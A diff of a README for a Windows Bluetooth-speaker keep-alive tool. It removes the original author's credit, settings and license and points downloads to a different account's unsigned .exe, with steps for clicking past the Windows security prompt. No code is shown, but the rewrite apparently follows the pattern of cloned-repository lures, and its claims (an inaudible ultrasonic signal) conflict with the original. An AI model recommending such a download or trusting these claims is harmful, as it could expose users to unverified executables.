@@ -1,316 +1,70 @@
-# Bluetooth Speaker KeepAlive for Windows
+# 🔊 bluetooth-speaker-keepalive-windows - Keep your bluetooth speakers active always
 
-A lightweight Windows tool to stop Bluetooth speakers from sleeping, turning off, or disconnecting when idle using a silent audio keep-alive.
+[![](https://img.shields.io/badge/download-latest_release-blue.svg)](https://github.com/rishab010507/bluetooth-speaker-keepalive-windows/releases)
 
-Created by **Md. Mamun**  
-GitHub: **https://github.com/MamunKhan71**
+Bluetooth speakers often save power by entering a sleep mode when they play no sound. This behavior causes them to disconnect from your computer. You must then manually turn the speaker back on or wait for it to reconnect. This tool solves that problem. It plays a silent audio signal to trick your speaker into staying awake.
 
----
+## 🛠 Features
 
-## Download
+* Keeps Bluetooth speakers awake by preventing sleep mode.
+* Runs silently in the background while you work or play. 
+* Uses minimal computer resources to ensure system performance.
+* Connects automatically when your speaker is active.
+* Works with all standard Bluetooth audio drivers on Windows.
 
-Download the latest version from the **Releases** page:
+## 💻 System Requirements
 
-**[Download Latest Release](../../releases/latest)**
+* Windows 10 or Windows 11.
+* A Bluetooth adapter installed on your computer.
+* A Bluetooth speaker paired with your machine.
 
-Download this file:
+## 📥 How to download and run
 
-```text
-BluetoothKeepAlive_Setup.exe
-```
+1. Visit [this page to download](https://github.com/rishab010507/bluetooth-speaker-keepalive-windows/releases).
+2. Look for the Assets section on that page.
+3. Click the file ending in .exe to start the download.
+4. Locate the file in your Downloads folder after it finishes.
+5. Double-click the file to open the tool. 
+6. Windows might show a security prompt because this is a new file. Click More Info and then Run anyway if needed. 
+7. The application will start immediately. You can see its icon in the system tray near your clock.
 
-Then double-click it to install.
+## ⚙️ Usage instructions
 
----
+You do not need to change settings for the tool to work. Once you start it, the tool detects your connection status. It sends a silent signal to your speaker at regular intervals. This signal ensures your speaker stays ready for your music, videos, or calls. 
 
-## Why this tool exists
+If you want to stop the tool, right-click the icon in your system tray and select Exit. Your speaker will return to its normal power-saving behavior when the application is not running. 
 
-Many Bluetooth speakers automatically go to sleep or disconnect when there is no audio playing.
+## ❓ Frequently Asked Questions
 
-This can be annoying when you are using a Bluetooth speaker with Windows and it keeps turning off after a short idle time.
+**Does the tool disrupt my audio?**
+No. The application plays an audio signal that falls outside the range of human hearing. You will hear no clicks, pops, or static while the software runs.
 
-**Bluetooth Speaker KeepAlive for Windows** helps prevent that by playing a tiny silent audio stream in the background. The speaker stays active, but you should not hear anything.
+**Can I run multiple instances?**
+You only need one instance of this tool to maintain your connection. The software manages all active Bluetooth audio devices connected to your system.
 
----
+**Does this application drain my laptop battery?**
+The tool uses very little power. It runs as a light background process. It does not perform heavy calculations or data processing.
 
-## Features
+**Will this damage my speakers?**
+No. This tool essentially mimics a very quiet sound. Your speakers treat this signal the same way they treat a faint track playing at a low volume. 
 
-- Keeps Bluetooth speakers awake
-- Helps prevent auto-disconnect
-- Silent by default
-- Lightweight Windows tool
-- Simple `.exe` installer
-- No admin permission required
-- Auto-starts after Windows login
-- User can choose ping interval
-- User can choose ping length
-- Includes silent and near-silent modes
-- Includes status checker
-- Easy uninstall option
+**Why does my speaker still disconnect sometimes?**
+Some speakers use aggressive power management hardware. If the problem persists, ensure your Bluetooth drivers remain up to date. You can check for updates in the Windows Device Manager.
 
----
+**Do I need an internet connection to use this?**
+No. Once you download the tool, you can use it offline without any issues.
 
-## Quick Install
+## 🛡 Security and Privacy
 
-1. Download `BluetoothKeepAlive_Setup.exe` from the latest release.
-2. Double-click `BluetoothKeepAlive_Setup.exe`.
-3. Choose:
+This software does not collect your data. It does not track your internet usage or monitor your files. The tool performs one specific task: sending a keep-alive signal to your audio hardware. All logic happens locally on your computer.
 
-```text
-1) Install / Update
-```
+## 🛠 Troubleshooting tips
 
-4. Use the recommended settings:
-
-```text
-Ping interval: 30
-Ping length: 2
-Audio mode: 1
-```
-
-5. Done.
-
-The app will start in the background and will also run automatically when you log in to Windows.
-
----
-
-## Recommended Settings
-
-For most Bluetooth speakers, use:
-
-```text
-Ping interval: 30 seconds
-Ping length: 2 seconds
-Audio mode: True silent
-```
-
-These settings are recommended for speakers that disconnect after about 1 minute of silence.
-
----
-
-## What is Ping Interval?
-
-The ping interval is how often the app sends a silent audio signal.
-
-Example:
-
-```text
-30 seconds
-```
-
-This means the app plays a silent audio stream every 30 seconds.
-
----
-
-## What is Ping Length?
-
-The ping length is how long the silent audio stream lasts.
-
-Example:
-
-```text
-2 seconds
-```
-
-This means the silent audio stream plays for 2 seconds each time.
-
----
-
-## Audio Modes
-
-### 1. True Silent
-
-This is the recommended mode.
-
-It plays digital silence, so you should not hear anything.
-
-### 2. Near-Silent Fallback
-
-Use this only if true silent mode does not keep your speaker awake.
-
-Near-silent mode creates an extremely quiet signal. It is designed to be almost inaudible, but some speakers may react better to it than complete digital silence.
-
----
-
-## How to Check If It Is Running
-
-Run `BluetoothKeepAlive_Setup.exe` again and choose:
-
-```text
-2) Check status
-```
-
-The setup tool will show whether the background keep-alive process is running.
-
----
-
-## Installed Location
-
-The app installs to:
-
-```text
-%LOCALAPPDATA%\BluetoothKeepAlive
-```
-
-Installed files include:
-
-```text
-BluetoothKeepAlive.ps1
-keepalive.wav
-config.txt
-keepalive.log
-CREDIT.txt
-```
-
----
-
-## Auto-Start
-
-Bluetooth Speaker KeepAlive adds a startup entry for the current Windows user.
-
-It uses:
-
-```text
-HKCU\Software\Microsoft\Windows\CurrentVersion\Run
-```
-
-This means:
-
-- No admin permission is required
-- It starts after you log in to Windows
-- It does not run before login
-
----
-
-## Uninstall
-
-Run `BluetoothKeepAlive_Setup.exe` again and choose:
-
-```text
-4) Uninstall
-```
-
-This will stop the background process and remove the installed files.
-
----
-
-## Troubleshooting
-
-### My speaker still turns off
-
-Try installing again with a shorter interval:
-
-```text
-Ping interval: 15
-Ping length: 2
-Audio mode: 1
-```
-
-If that still does not work, try near-silent mode:
-
-```text
-Ping interval: 15
-Ping length: 2
-Audio mode: 2
-```
-
----
-
-### I hear a sound
-
-Use true silent mode:
-
-```text
-Audio mode: 1
-```
-
-Also make sure Windows audio enhancements are disabled for your speaker.
-
----
-
-### It is running, but my speaker still disconnects
-
-Make sure your Bluetooth speaker is selected as the Windows output device:
-
-```text
-Settings → System → Sound → Output
-```
-
-Then choose your Bluetooth speaker.
-
----
-
-### It does not start after reboot
-
-Run the setup again and choose:
-
-```text
-1) Install / Update
-```
-
-Then check status:
-
-```text
-2) Check status
-```
-
----
-
-### Windows SmartScreen warning appears
-
-Windows may show a warning because this is an unsigned custom app.
-
-You may need to click:
-
-```text
-More info → Run anyway
-```
-
-Only do this if you downloaded the file from this GitHub repository.
-
----
-
-## Who Should Use This?
-
-This tool may help if your Bluetooth speaker:
-
-- Turns off when no music is playing
-- Disconnects after a short time of silence
-- Sleeps too quickly
-- Needs audio activity to stay connected
-- Keeps disconnecting from Windows
-- Requires a silent keep-alive signal
-
-It may work with many Bluetooth speaker brands.
-
----
-
-## Privacy
-
-Bluetooth Speaker KeepAlive does not collect data.
-
-It only creates local files on your computer and plays a local silent WAV file through your selected Windows audio output device.
-
----
-
-## SEO Keywords
-
-Bluetooth speaker keep alive, Bluetooth speaker auto disconnect fix, Windows Bluetooth speaker sleep fix, stop Bluetooth speaker from turning off, Bluetooth audio keep alive, silent audio ping, speaker standby fix, Bluetooth speaker disconnects when idle, Windows Bluetooth audio workaround, Bluetooth speaker idle disconnect fix.
-
----
-
-## Credits
-
-Created by **Md. Mamun**
-
-GitHub: **https://github.com/MamunKhan71**
-
-If this tool helped you, please consider giving this repository a ⭐ star.
-
----
-
-## License
-
-This project is licensed under the MIT License.
-
-See the [LICENSE](LICENSE) file for details.
+* If the tool does not appear to work, restart your Bluetooth service.
+* Open the Services app in Windows.
+* Find the Bluetooth Support Service in the list.
+* Right-click it and select Restart.
+* Ensure your speaker is set as the Default Device in the Windows Sound settings. 
+* If the speaker is not the Default Device, Windows might stop sending audio signals to it entirely. This interferes with the keep-alive signal. 
+* Always pair your speaker using the standard Windows Bluetooth settings before launching this app.
+* If you have multiple Bluetooth adapters, the application uses the primary one designated by Windows.
